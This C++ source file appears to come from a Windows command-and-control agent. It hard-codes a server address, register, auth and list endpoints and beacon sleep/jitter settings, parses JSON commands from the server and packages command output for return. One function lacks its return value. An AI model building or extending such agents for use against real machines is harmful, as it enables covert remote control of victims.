#include "apiFunc.hpp"
#include "cJSON.h"
#include <iostream>


#define FIXED_JSON_SIZE 28
#define BASE_BUFFER_SIZE 256

//template<typename T>
//T* AllocMemory(SIZE_T size) {
//	return (T*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size);
//}

BOOL AllocateAndLoadNeeded() {
	
	AuthConf			= AllocMemory<AuthConfig>   (sizeof(AuthConfig));
	ServerConf			= AllocMemory<ServerConfig> (sizeof(ServerConfig));
	CommandInfo         = AllocMemory<COMMANDINFO>  (sizeof(COMMANDINFO));
	g_NetworkManager    = AllocMemory<Network>      (sizeof(Network));
	KModules            = AllocMemory<MODULES>      (sizeof(struct MODULES));
	WinApis             = AllocMemory<WINAPIS>      (sizeof(struct WINAPIS));

	if (AuthConf == NULL || ServerConf == NULL || g_NetworkManager == NULL || KModules == NULL || WinApis == NULL) {
		return FALSE;
	}

	CommandInfo->commandID = NULL;
	CommandInfo->commandCode = 0;
	CommandInfo->param = NULL;
	CommandInfo->param2 = NULL;

	if (!LoadApis()) {
		return FALSE;
	}


	// TODO
	// create a python builder and let the user choose the configuration details
	// store encrypted somewhere in the compiled binary
	strcpy_s(ServerConf->BaseURL, sizeof(ServerConf->BaseURL), "192.168.1.24");
	strcpy_s(ServerConf->registerEndpoint, sizeof(ServerConf->registerEndpoint), "/api/v1/register");
	strcpy_s(ServerConf->postEndpoint, sizeof(ServerConf->postEndpoint), "/api/v1/auth");
	strcpy_s(ServerConf->getEndpoint, sizeof(ServerConf->getEndpoint), "/api/v1/list");
	ServerConf->UseSSL = 0;
	ServerConf->SleepTime = 15;
	ServerConf->Jitter = 10;

}


// Parses the json command info and stores into the command struct 
BOOL ParseCommandJson(PCHAR CommandString) {
	
	
	if (!CommandInfo) return FALSE;

	cJSON *c =  cJSON_Parse(CommandString);
	if (!c) return FALSE;

	cJSON* commandID = cJSON_GetObjectItem(c, "command_id");
	cJSON* CommandCode = cJSON_GetObjectItem(c, "code");
	cJSON* param = cJSON_GetObjectItem(c, "param");
	cJSON* param2 = cJSON_GetObjectItem(c, "param2");
	
	if (cJSON_IsString(commandID)) {
		free(CommandInfo->commandID);
		CommandInfo->commandID = _strdup(commandID->valuestring);
	}
	else return FALSE;
	if (cJSON_IsNumber(CommandCode)) {
		CommandInfo->commandCode = CommandCode->valueint;
	}
	else return FALSE;
	if (cJSON_IsString(param)) {
		free(CommandInfo->param);
		CommandInfo->param = _strdup(param->valuestring);
	}
	else return FALSE;
	if (cJSON_IsString(param2)) {
		free(CommandInfo->param2);
		CommandInfo->param2 = _strdup(param2->valuestring);
	}

	

	cJSON_Delete(c);
	return !(CommandInfo->commandCode == 0 || !CommandInfo->commandID || !CommandInfo->param);

}


BOOL CraftOutputJson(PCHAR CommandID, PCHAR outputData, _Out_ PCHAR* JsonOutput) {
	if (!CommandID || !outputData) {
		return FALSE;
	}

	cJSON* c = cJSON_CreateObject();
	if (!c) return FALSE;

	cJSON_AddStringToObject(c, "command_id", CommandID);
	cJSON_AddStringToObject(c, "output", outputData);
	char* tempJson = cJSON_PrintUnformatted(c);
	cJSON_Delete(c);
	if (!tempJson) return FALSE;
	SIZE_T JsonSize = strlen(tempJson) + 1;

	if (*JsonOutput == NULL) {
		*JsonOutput = AllocMemory<CHAR>(JsonSize);
		if (!*JsonOutput) {
			cJSON_free(tempJson);
			return FALSE;
		}
	}

	
	// copy the data
	memcpy(*JsonOutput, tempJson, JsonSize);

	cJSON_free(tempJson); 
	return TRUE;
	
}


SIZE_T CaluclateSizeOfFinalJson(SIZE_T OutputSize, SIZE_T CommandIdSize) {
	return FIXED_JSON_SIZE + OutputSize + CommandIdSize + 4;
}

//INT _strncmp(PCHAR src, PCHAR dest, INT count) {
//
//}


